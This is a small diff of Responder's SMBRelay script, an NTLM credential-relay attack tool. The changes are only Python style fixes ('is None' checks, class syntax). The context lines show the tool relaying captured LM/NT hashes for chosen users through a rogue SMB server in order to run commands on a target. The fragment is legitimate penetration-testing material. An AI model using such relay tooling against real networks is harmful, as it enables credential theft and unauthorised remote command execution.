@@ -65,7 +65,7 @@ print "\nResponder SMBRelay 0.1\nPlease send bugs/comments to: lgaffie@trustwave
 print '\033[31m'+'Use this script in combination with Responder.py for best results (remember to set SMB = Off in Responder.conf)..\nUsernames  to relay (-u) are case sensitive.'+'\033[0m'
 print 'To kill this script hit CRTL-C or Enter\nWill relay credentials for these users: '+'\033[1m\033[34m'+', '.join(UserToRelay)+'\033[0m\n'
 
-class Packet():
+class Packet:
     fields = OrderedDict([
         ("data", ""),
     ])
@@ -88,14 +88,14 @@ Logs.basicConfig(filemode="w",filename='SMBRelay-Session.txt',format='',level=lo
 def ReadData(outfile,Client, User, cmd=None):
     try:
         with open(ResponderPATH+outfile,"r") as filestr:
-            if cmd == None:
+            if cmd is None:
                 String = Client+':'+User
                 if re.search(String.encode('hex'), filestr.read().encode('hex')):
                     filestr.close()
                     return True
                 else:
                     return False
-            if cmd != None:
+            if cmd is not None:
                 String = Client+","+User+","+cmd
                 if re.search(String.encode('hex'), filestr.read().encode('hex')):
                     filestr.close()
@@ -255,7 +255,7 @@ def RunRelay(host, Command,Domain):
             a = SmbRogueSrv139(Key,Target,DomainMachineName)
             if a is not None:
                 LMHash,NTHash,Username,OriginalDomain, CLIENTIP = a
-                if Domain == None:
+                if Domain is None:
                     Domain = OriginalDomain
                 if ReadData("SMBRelay-Session.txt", Target, Username, CMD):
                     pass
